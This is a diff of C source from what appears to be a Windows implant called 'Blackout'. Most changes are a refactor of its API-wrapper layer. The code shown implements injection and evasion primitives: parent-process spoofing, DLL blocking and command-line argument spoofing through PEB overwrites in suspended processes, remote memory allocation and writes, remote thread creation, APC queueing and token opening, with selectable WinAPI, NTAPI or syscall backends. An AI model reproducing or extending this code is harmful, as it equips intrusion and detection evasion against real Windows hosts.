@@ -9,7 +9,7 @@ FUNC PVOID bkHeapAlloc(
 ) {
     BLACKOUT_INSTANCE
 
-    PVOID VmHeap = Instance()->Win32.RtlAllocateHeap( Blackout().Heap, 0, Size );
+    PVOID VmHeap = Win32().RtlAllocateHeap( Blackout().Heap, 0, Size );
 
     return VmHeap;
 }
@@ -20,7 +20,7 @@ FUNC PVOID bkHeapReAlloc(
 ) {
     BLACKOUT_INSTANCE
 
-    PVOID VmHeap = Instance()->Win32.RtlReAllocateHeap( Blackout().Heap, 0, Addr, Size );
+    PVOID VmHeap = Win32().RtlReAllocateHeap( Blackout().Heap, 0, Addr, Size );
 
     return VmHeap;
 }
@@ -32,7 +32,7 @@ FUNC BOOL bkHeapFree(
     BLACKOUT_INSTANCE
 
     MmZero( Data, Size );
-    BOOL bSuc = Instance()->Win32.RtlFreeHeap( Blackout().Heap, 0, Data );
+    BOOL bSuc = Win32().RtlFreeHeap( Blackout().Heap, 0, Data );
     Data = NULL;
 
     return bSuc;
@@ -51,7 +51,7 @@ FUNC DWORD bkProcessOpen(
     DWORD bkErrorCode = 0;
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
-        *ProcessHandle = Instance()->Win32.OpenProcess( DesiredAccess, InheritHandle, ProcessId );
+        *ProcessHandle = Win32().OpenProcess( DesiredAccess, InheritHandle, ProcessId );
         bkErrorCode = NtLastError();
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
         CLIENT_ID ClientId = { 0 };
@@ -61,7 +61,7 @@ FUNC DWORD bkProcessOpen(
         MmZero(&ClientId, sizeof(CLIENT_ID));
         ClientId.UniqueProcess = ProcessId;
 
-        bkErrorCode = Instance()->Win32.NtOpenProcess(&hProcessTmp, DesiredAccess, &ProcAttr, &ClientId);
+        bkErrorCode = Win32().NtOpenProcess(&hProcessTmp, DesiredAccess, &ProcAttr, &ClientId);
         *ProcessHandle = hProcessTmp;
     }
 
@@ -75,9 +75,9 @@ FUNC DWORD bkProcessTerminate(
     BLACKOUT_INSTANCE
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
-        Instance()->Win32.TerminateProcess(hProcess, ExitStatus);
+        Win32().TerminateProcess(hProcess, ExitStatus);
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
-        Instance()->Win32.NtTerminateProcess(hProcess, ExitStatus);
+        Win32().NtTerminateProcess(hProcess, ExitStatus);
     } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
         // SET_SYSCALL(Syscall().SysTable.NtTerminateProcess);
         // RunSyscall(hProcess, ExitStatus);   
@@ -128,12 +128,12 @@ FUNC DWORD bkProcessCreate(
     MmZero( &Si,  sizeof( STARTUPINFOEXA ) );
 
     if ( Pipe ) {
-        Output                       = Instance()->Win32.LocalAlloc( LPTR, 1025 );
+        Output                       = Win32().LocalAlloc( LPTR, 1025 );
         SecAttr.bInheritHandle       = TRUE;
         SecAttr.nLength              = sizeof( SECURITY_ATTRIBUTES );
         SecAttr.lpSecurityDescriptor = NULL;
 
-        Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecAttr, 0 );
+        Win32().CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecAttr, 0 );
 
         Si.StartupInfo.hStdError  = hStdPipeWrite;
         Si.StartupInfo.hStdOutput = hStdPipeWrite;
@@ -150,22 +150,22 @@ FUNC DWORD bkProcessCreate(
     if ( Blackout().Fork.Ppid      ) Count++;
 
     if ( Count != 0 ) {
-        Instance()->Win32.InitializeProcThreadAttributeList( NULL, Count, 0, &AttrSize );
+        Win32().InitializeProcThreadAttributeList( NULL, Count, 0, &AttrSize );
         AttrBuff = bkHeapAlloc( AttrSize );
-        Instance()->Win32.InitializeProcThreadAttributeList( AttrBuff, Count, 0, &AttrSize );
+        Win32().InitializeProcThreadAttributeList( AttrBuff, Count, 0, &AttrSize );
         Flags += EXTENDED_STARTUPINFO_PRESENT;
     }
 
-    if ( Blackout().Fork.Blockdlls ) Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
+    if ( Blackout().Fork.Blockdlls ) Win32().UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( UINT64 ), NULL, 0 );
     if ( Blackout().Fork.Ppid      ) {
         bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, Blackout().Fork.Ppid, &hParentProcess );
-        Instance()->Win32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof( HANDLE ), NULL, 0 );
+        Win32().UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof( HANDLE ), NULL, 0 );
     }
     if ( Blackout().Fork.Argue ) Flags += CREATE_SUSPENDED;
      
     if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;
 
-    bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
+    bCheck = Win32().CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
     if ( !bCheck ) goto _Leave;
 
     *ProcessId     = Pi.dwProcessId;
@@ -174,22 +174,22 @@ FUNC DWORD bkProcessCreate(
     *ThreadHandle  = Pi.hThread;
 
     if ( Blackout().Fork.Argue ) {
-        Instance()->Win32.NtQueryInformationProcess( Pi.hProcess, ProcessBasicInformation, &Pbi, sizeof( PROCESS_BASIC_INFORMATION ), &RetLen );
-        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), &BytesRead );
-        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Peb->ProcessParameters, Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &BytesRead );
-        Instance()->Win32.WriteProcessMemory( Pi.hProcess, Upp->CommandLine.Buffer, Blackout().Fork.Argue, StringLengthW( Blackout().Fork.Argue ) * 2 + 1, &BytesRead );
-        Instance()->Win32.NtResumeThread( Pi.hThread, 0 );
+        Win32().NtQueryInformationProcess( Pi.hProcess, ProcessBasicInformation, &Pbi, sizeof( PROCESS_BASIC_INFORMATION ), &RetLen );
+        Win32().ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), &BytesRead );
+        Win32().ReadProcessMemory( Pi.hProcess, Peb->ProcessParameters, Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &BytesRead );
+        Win32().WriteProcessMemory( Pi.hProcess, Upp->CommandLine.Buffer, Blackout().Fork.Argue, StringLengthW( Blackout().Fork.Argue ) * 2 + 1, &BytesRead );
+        Win32().NtResumeThread( Pi.hThread, 0 );
     }
 
     if ( Pipe ) {
         bkHandleClose( hStdPipeWrite );
 
         do {
-            bPipeRead = Instance()->Win32.ReadFile( hStdPipeRead, Buffer, 1024, &PipesBytesRead, NULL );
+            bPipeRead = Win32().ReadFile( hStdPipeRead, Buffer, 1024, &PipesBytesRead, NULL );
 
             if ( !PipesBytesRead ) break;
 
-            Output = Instance()->Win32.LocalReAlloc(
+            Output = Win32().LocalReAlloc(
                 Output, PipeBufferSize + PipesBytesRead,
                 LMEM_MOVEABLE | LMEM_ZEROINIT
             );
@@ -205,7 +205,7 @@ FUNC DWORD bkProcessCreate(
     }
 
 _Leave:
-    if ( AttrBuff      ) Instance()->Win32.DeleteProcThreadAttributeList( AttrBuff );
+    if ( AttrBuff      ) Win32().DeleteProcThreadAttributeList( AttrBuff );
     if ( AttrBuff      ) bkHeapFree( AttrBuff, AttrSize );
     if ( Peb           ) bkHeapFree( Peb, sizeof( PEB ) );
     if ( Upp           ) bkHeapFree( Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) );
@@ -215,7 +215,7 @@ _Leave:
         if ( Output ) {
             PackageAddBytes( BK_PACKAGE, Output, OutSize );
             MmZero( Output, OutSize );
-            Instance()->Win32.LocalFree( Output );
+            Win32().LocalFree( Output );
         }
     } 
     
@@ -237,9 +237,9 @@ FUNC DWORD bkMemAlloc(
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         if ( ProcessHandle ) {
-            *BaseAddr = Instance()->Win32.VirtualAllocEx(ProcessHandle, *BaseAddr, RegionSize, AllocationType, Protection);
+            *BaseAddr = Win32().VirtualAllocEx(ProcessHandle, *BaseAddr, RegionSize, AllocationType, Protection);
         } else {
-            *BaseAddr = Instance()->Win32.VirtualAlloc(NULL, RegionSize, AllocationType, Protection);
+            *BaseAddr = Win32().VirtualAlloc(NULL, RegionSize, AllocationType, Protection);
         }
         bkErrorCode = NtLastError();
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
@@ -248,7 +248,7 @@ FUNC DWORD bkMemAlloc(
         if ( !ProcessHandle )
             ProcessHandle = NtCurrentProcess();
 
-        bkErrorCode = Instance()->Win32.NtAllocateVirtualMemory(ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection);
+        bkErrorCode = Win32().NtAllocateVirtualMemory(ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection);
         *BaseAddr = MemAllocated;
     } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
         PVOID MemAllocated = NULL;
@@ -277,7 +277,7 @@ FUNC DWORD bkMemWrite(
 
     if (Blackout().bkApi == _BK_API_WINAPI_) {
         if (ProcessHandle) {
-            Instance()->Win32.WriteProcessMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
+            Win32().WriteProcessMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
         } else {
             MmCopy( MemBaseAddr, Buffer, BufferSize );
         }
@@ -286,7 +286,7 @@ FUNC DWORD bkMemWrite(
         if (!ProcessHandle)    
             ProcessHandle = NtCurrentProcess();
 
-        bkErrorCode = Instance()->Win32.NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
+        bkErrorCode = Win32().NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
     } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
         if (!ProcessHandle)    
             ProcessHandle = NtCurrentProcess();
@@ -302,7 +302,8 @@ FUNC DWORD bkMemProtect(
     _In_  HANDLE ProcessHandle,
     _In_  PVOID  BaseAddr,
     _In_  UINT64 RegionSize,
-    _In_  DWORD  NewProtection
+    _In_  DWORD  NewProtection,
+    _Out_opt_ UINT32 *OldProtectionRt 
 ) {
     BLACKOUT_INSTANCE
 
@@ -311,16 +312,16 @@ FUNC DWORD bkMemProtect(
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         if ( ProcessHandle ) {
-            Instance()->Win32.VirtualProtectEx( ProcessHandle, BaseAddr, RegionSize, NewProtection, &OldProtection );
+            Win32().VirtualProtectEx( ProcessHandle, BaseAddr, RegionSize, NewProtection, &OldProtection );
         } else {
-            Instance()->Win32.VirtualProtect( BaseAddr, RegionSize, NewProtection, &OldProtection );
+            Win32().VirtualProtect( BaseAddr, RegionSize, NewProtection, &OldProtection );
         }
         bkErrorCode = NtLastError();
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
         if ( !ProcessHandle )    
             ProcessHandle = NtCurrentProcess();
         
-        bkErrorCode = Instance()->Win32.NtProtectVirtualMemory( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
+        bkErrorCode = Win32().NtProtectVirtualMemory( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
     } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
         if ( !ProcessHandle )    
             ProcessHandle = NtCurrentProcess();
@@ -329,19 +330,15 @@ FUNC DWORD bkMemProtect(
         // RunSyscall(ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection);
     }
     
+    *OldProtectionRt = OldProtection;
+    
     return bkErrorCode;
 }
 
 FUNC DWORD bkMemQuery(
     _In_opt_ HANDLE  ProcessHandle,
     _In_     PVOID   BaseAddress,
-    _Out_    PVOID  *AllocationBase,
-    _Out_    DWORD  *AllocationProtect,
-    _Out_    PVOID  *BaseAddressRt,
-    _Out_    DWORD  *Protect,
-    _Out_    DWORD  *RegionSize,
-    _Out_    DWORD  *State,
-    _Out_    DWORD  *Type
+    _Out_    MEMORY_BASIC_INFORMATION *MbiRt
 ) {
     BLACKOUT_INSTANCE
 
@@ -352,19 +349,19 @@ FUNC DWORD bkMemQuery(
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         if (ProcessHandle) {
-            Instance()->Win32.VirtualQueryEx( ProcessHandle, BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
+            Win32().VirtualQueryEx( ProcessHandle, BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
         } else {
-            Instance()->Win32.VirtualQuery( BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
+            Win32().VirtualQuery( BaseAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION) );
         }
         bkErrorCode = NtLastError();
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
         if ( !ProcessHandle )
             ProcessHandle = NtCurrentProcess();
 
-        bkErrorCode = Instance()->Win32.NtQueryVirtualMemory(
+        bkErrorCode = Win32().NtQueryVirtualMemory(
             ProcessHandle, BaseAddress,
             MemoryBasicInformation, &Mbi,
-            sizeof(MEMORY_BASIC_INFORMATION), NULL
+            sizeof( MEMORY_BASIC_INFORMATION ), NULL
         );
     } else if ( Blackout().bkApi == _BK_API_SYSCALL_ ) {
         if ( !ProcessHandle )
@@ -378,13 +375,7 @@ FUNC DWORD bkMemQuery(
         // );
     }
 
-    *AllocationBase    = Mbi.AllocationBase;
-    *AllocationProtect = Mbi.AllocationProtect;
-    *BaseAddressRt     = Mbi.BaseAddress;
-    *Protect           = Mbi.Protect;
-    *RegionSize        = Mbi.RegionSize;
-    *State             = Mbi.State;
-    *Type              = Mbi.Type;
+    *MbiRt = Mbi;
 
     return bkErrorCode;
 }
@@ -401,14 +392,14 @@ FUNC DWORD bkMemFree(
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
 
         if ( ProcessHandle ) {
-            Instance()->Win32.VirtualFreeEx( ProcessHandle, MemAddress, SizeToFree, MEM_RELEASE );
+            Win32().VirtualFreeEx( ProcessHandle, MemAddress, SizeToFree, MEM_RELEASE );
         } else {
-            Instance()->Win32.VirtualFree( MemAddress, SizeToFree, MEM_RELEASE );
+            Win32().VirtualFree( MemAddress, SizeToFree, MEM_RELEASE );
         }
         bkErrorCode = NtLastError();
 
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
-        bkErrorCode = Instance()->Win32.NtFreeVirtualMemory( ProcessHandle, &MemAddress, SizeToFree, MEM_RELEASE );
+        bkErrorCode = Win32().NtFreeVirtualMemory( ProcessHandle, &MemAddress, SizeToFree, MEM_RELEASE );
     }
 
     return bkErrorCode;
@@ -427,7 +418,7 @@ FUNC UINT32 bkThreadOpen(
 
     UINT32 bkErrorCode = 0;
 
-    *ThreadHandle = Instance()->Win32.OpenThread( AccessRights, InheritHandle, ThreadId );
+    *ThreadHandle = Win32().OpenThread( AccessRights, InheritHandle, ThreadId );
     bkErrorCode   = NtLastError();
 
     return bkErrorCode;
@@ -449,17 +440,17 @@ FUNC DWORD bkThreadCreate(
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         DWORD ThreadIdTmp = 0;
         if ( ProcessHandle ) {
-            ThreadHandle = Instance()->Win32.CreateRemoteThread( ProcessHandle, NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
+            ThreadHandle = Win32().CreateRemoteThread( ProcessHandle, NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
             *ThreadId = ThreadIdTmp;
         } else {
-            ThreadHandle = Instance()->Win32.CreateThread( NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
+            ThreadHandle = Win32().CreateThread( NULL, StackSize, BaseAddr, Parameter, Flags, &ThreadIdTmp );
             *ThreadId = ThreadIdTmp;
         }
 
         bkErrorCode = NtLastError();
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
-        bkErrorCode = Instance()->Win32.NtCreateThreadEx( &ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, BaseAddr, Parameter, Flags, 0, StackSize, 0, NULL );
-        *ThreadId = Instance()->Win32.GetThreadId( ThreadHandle );
+        bkErrorCode = Win32().NtCreateThreadEx( &ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, BaseAddr, Parameter, Flags, 0, StackSize, 0, NULL );
+        *ThreadId = Win32().GetThreadId( ThreadHandle );
     }
     
     return bkErrorCode;
@@ -475,12 +466,12 @@ FUNC DWORD bkThreadTerminate(
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
 
-        Instance()->Win32.TerminateThread(ThreadHandle, ExitCode);
+        Win32().TerminateThread(ThreadHandle, ExitCode);
         bkErrorCode = NtLastError();
         
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
 
-        bkErrorCode = Instance()->Win32.NtTerminateThread(ThreadHandle, ExitCode);
+        bkErrorCode = Win32().NtTerminateThread(ThreadHandle, ExitCode);
 
     }
 
@@ -495,10 +486,10 @@ FUNC DWORD bkThreadSuspend(
     DWORD bkErrorCode = 0;
 
     if (Blackout().bkApi == _BK_API_WINAPI_ ) {
-        Instance()->Win32.SuspendThread(ThreadHandle);
+        Win32().SuspendThread(ThreadHandle);
         bkErrorCode = NtLastError();
     } else if (Blackout().bkApi == _BK_API_NTAPI_ ) {
-        bkErrorCode = Instance()->Win32.NtSuspendThread(ThreadHandle, NULL);
+        bkErrorCode = Win32().NtSuspendThread(ThreadHandle, NULL);
     }
 
     return bkErrorCode;
@@ -513,10 +504,10 @@ FUNC DWORD bkThreadResume(
     DWORD bkErrorCode = 0;
 
     if (Blackout().bkApi == _BK_API_WINAPI_ ) {
-        Instance()->Win32.ResumeThread(ThreadHandle);
+        Win32().ResumeThread(ThreadHandle);
         bkErrorCode = NtLastError();
     } else if (Blackout().bkApi == _BK_API_NTAPI_ ) {
-        bkErrorCode = Instance()->Win32.NtResumeThread(ThreadHandle, NULL);
+        bkErrorCode = Win32().NtResumeThread(ThreadHandle, NULL);
     }
 
     return bkErrorCode;
@@ -534,12 +525,12 @@ FUNC DWORD bkThreadApcQueue(
 
     if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
         
-        bkErrorCode =  Instance()->Win32.QueueUserAPC( BaseAddress, ThreadHandle, Parameter );
+        bkErrorCode =  Win32().QueueUserAPC( BaseAddress, ThreadHandle, Parameter );
         if ( !bkErrorCode ) return NtLastError();
 
     } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
 
-        bkErrorCode =  Instance()->Win32.NtQueueApcThread( ThreadHandle, BaseAddress, Parameter, NULL, NULL );
+        bkErrorCode =  Win32().NtQueueApcThread( ThreadHandle, BaseAddress, Parameter, NULL, NULL );
         return bkErrorCode;
 
     } else {
@@ -561,12 +552,12 @@ FUNC UINT32 bkThreadEnum(
     UINT32                      ThreadId      = 0;
     BOOL                        bkSuccess     = FALSE;
 
-    Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
+    Win32().NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
 
-    SysProcInfo = Instance()->Win32.LocalAlloc( LPTR, ReturnLen );
+    SysProcInfo = Win32().LocalAlloc( LPTR, ReturnLen );
     ValToFree   = SysProcInfo;
 
-    bkErrorCode = Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
+    bkErrorCode = Win32().NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
     if ( bkErrorCode ) goto _bk_leave;
 
     SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
@@ -586,7 +577,7 @@ FUNC UINT32 bkThreadEnum(
     }
 
 _bk_leave:
-    if ( SysProcInfo ) Instance()->Win32.LocalFree( ValToFree );
+    if ( SysProcInfo ) Win32().LocalFree( ValToFree );
     return ThreadId; 
 }
 
@@ -605,23 +596,23 @@ FUNC DWORD bkTokenOpen(
     if ( ObjectType == 0x01 ) {
         if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
 
-            Instance()->Win32.OpenProcessToken( TargetHandle, AccessRights, TokenHandle );
+            Win32().OpenProcessToken( TargetHandle, AccessRights, TokenHandle );
             bkErrorCode =  NtLastError();
 
         } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
 
-            bkErrorCode =  Instance()->Win32.NtOpenProcessToken( TargetHandle, AccessRights, TokenHandle );
+            bkErrorCode =  Win32().NtOpenProcessToken( TargetHandle, AccessRights, TokenHandle );
 
         }
     } else if ( ObjectType == 0x02 ) {
         if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
 
-            Instance()->Win32.OpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );
+            Win32().OpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );
             bkErrorCode = NtLastError();
 
         } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
 
-            bkErrorCode = Instance()->Win32.NtOpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );
+            bkErrorCode = Win32().NtOpenThreadToken( TargetHandle, AccessRights, FALSE, TokenHandle );
 
         }
 
@@ -644,9 +635,9 @@ FUNC BOOL bkHandleClose(
 
     if (hObject) {
         if ( Blackout().bkApi == _BK_API_WINAPI_ ) {
-            bCheck = Instance()->Win32.CloseHandle(hObject);
+            bCheck = Win32().CloseHandle(hObject);
         } else if ( Blackout().bkApi == _BK_API_NTAPI_ ) {
-            bCheck = (Instance()->Win32.NtClose(hObject) == STATUS_SUCCESS);
+            bCheck = (Win32().NtClose(hObject) == STATUS_SUCCESS);
         }
     }
 
@@ -659,7 +650,7 @@ FUNC DWORD bkFileCreate(
 ) {
     BLACKOUT_INSTANCE
 
-    //Instance()->Win32.CreateFileA( FileName, AccessRights. )
+    //Win32().CreateFileA( FileName, AccessRights. )
 
 } 
 
@@ -670,7 +661,7 @@ FUNC DWORD bkPipeCreate(
     BLACKOUT_INSTANCE
 
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
-    Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecurityAttr, 0 );
+    Win32().CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecurityAttr, 0 );
 
     return NtLastError();
 }
